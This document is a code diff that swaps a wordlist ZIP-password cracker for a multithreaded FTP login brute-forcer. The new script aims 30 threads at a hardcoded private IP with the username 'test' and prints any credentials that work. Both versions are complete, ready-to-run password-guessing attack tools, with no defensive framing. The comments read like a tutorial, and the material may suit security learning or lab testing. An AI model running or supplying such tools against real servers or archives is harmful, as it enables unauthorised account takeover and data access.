@@ -1,74 +1,63 @@
-import os
-import sys
-import zipfile
-import pyzipper
-import argparse
-from datetime import datetime
-import time
+import ftplib
+from threading import Thread
+import queue
+from colorama import Fore, init # for fancy colors, nothing else
 
-# Brute force for ZIP file
-def brute_force_zip(zip_file_path, wordlist_path, extraction_path):
-    failed_attempts = []  # List to store failed attempts for one line of output
-    
-    # Open the ZIP file using pyzipper (supports AES-encrypted ZIPs)
-    with pyzipper.AESZipFile(zip_file_path) as zf:
-        # Open the wordlist file to iterate over each password
-        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as wordlist_file:
-            # Loop through each line in the wordlist
-            for line in wordlist_file:
-                password_str = line.strip()  # Remove any leading/trailing whitespace (e.g., newlines)
-                
-                try:
-                    # Set the password for the ZIP file
-                    zf.pwd = password_str.encode('utf-8')
-                    
-                    # Try extracting the contents of the ZIP file
-                    zf.extractall(path=extraction_path)
-                    
-                    # If successful, print and return the password
-                    print(f"Password found: {password_str}")
-                    return password_str
-                
-                except RuntimeError:
-                    # If extraction fails, the password is incorrect
-                    failed_attempts.append(password_str)  # Append failed attempt to the list
-                    continue
-                except Exception as e:
-                    # If there are other errors, print them and continue
-                    print(f"Error for: {password_str}, Error: {e}")
-                    continue
+# init the console for colors (for Windows)
+# init()
+# initialize the queue
+q = queue.Queue()
+# number of threads to spawn
+n_threads = 30
+# hostname or IP address of the FTP server
+host = "192.168.1.113"
+# username of the FTP server, root as default for linux
+user = "test"
+# port of FTP, aka 21
+port = 21
 
-    # After all attempts, print all failed attempts in a single line
-    if failed_attempts:
-        print(f"Attempt Failed: {' '.join(failed_attempts)}")  # Join all failed attempts into one line
-    else:
-        print("Password not found in the wordlist")
+def connect_ftp():
+    global q
+    while True:
+        # get the password from the queue
+        password = q.get()
+        # initialize the FTP server object
+        server = ftplib.FTP()
+        print("[!] Trying", password)
+        try:
+            # tries to connect to FTP server with a timeout of 5
+            server.connect(host, port, timeout=5)
+            # login using the credentials (user & password)
+            server.login(user, password)
+        except ftplib.error_perm:
+            # login failed, wrong credentials
+            pass
+        else:
+            # correct credentials
+            print(f"{Fore.GREEN}[+] Found credentials: ")
+            print(f"\tHost: {host}")
+            print(f"\tUser: {user}")
+            print(f"\tPassword: {password}{Fore.RESET}")
+            # we found the password, let's clear the queue
+            with q.mutex:
+                q.queue.clear()
+                q.all_tasks_done.notify_all()
+                q.unfinished_tasks = 0
+        finally:
+            # notify the queue that the task is completed for this password
+            q.task_done()
 
-# Main execution logic for ZIP cracking with argparse
-if __name__ == "__main__":
-    # Set up argument parsing for the ZIP file cracking functionality
-    parser = argparse.ArgumentParser(description="Crack a ZIP file password using a wordlist.")
-    parser.add_argument('-z', '--zip', type=str, help="Path to the ZIP file", required=True)
-    parser.add_argument('wordlist', type=str, help="Path to the wordlist file")
-    parser.add_argument('-e', '--extract', type=str, help="Path to extract the ZIP file contents", required=True)
-
-    args = parser.parse_args()
-
-    # Ensure the wordlist exists
-    if not os.path.exists(args.wordlist):
-        print(f"Error: Wordlist file '{args.wordlist}' not found.")
-        sys.exit(1)
-
-    # Ensure the ZIP file exists
-    if not os.path.exists(args.zip):
-        print(f"Error: ZIP file '{args.zip}' not found.")
-        sys.exit(1)
-
-    # Ensure the extraction path exists
-    if not os.path.exists(args.extract):
-        print(f"Error: Extraction path '{args.extract}' does not exist.")
-        sys.exit(1)
-
-    # Perform the ZIP cracking
-    print("\n[+] Cracking ZIP file password...")
-    brute_force_zip(args.zip, args.wordlist, args.extract)
+# read the wordlist of passwords
+passwords = open("wordlist.txt").read().split("\n")
+print("[+] Passwords to try:", len(passwords))
+# put all passwords to the queue
+for password in passwords:
+    q.put(password)
+# create `n_threads` that runs that function
+for t in range(n_threads):
+    thread = Thread(target=connect_ftp)
+    # will end when the main thread end
+    thread.daemon = True
+    thread.start()
+# wait for the queue to be empty
+q.join()
